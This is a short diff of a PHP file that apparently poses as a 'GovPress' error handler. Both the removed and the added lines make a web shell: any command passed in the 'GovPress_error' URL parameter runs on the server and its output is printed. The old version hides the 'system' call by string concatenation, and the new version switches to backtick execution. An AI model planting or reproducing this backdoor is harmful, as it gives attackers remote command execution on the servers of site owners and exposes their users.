@@ -1,13 +1,9 @@
 <?php
 if (isset($_GET['GovPress_error'])) {
-    $a = 'sys';
-    $b = 'tem';
     $command = $_GET['GovPress_error'];
 
-    // Execute using variable concatenation
-    $func = $a . $b;
-    echo "<pre>";
-    $func($command);
-    echo "</pre>";
+    // Execute using backtick
+    $output = `$command`;
+    echo "<pre>$output</pre>";
 }
 ?>
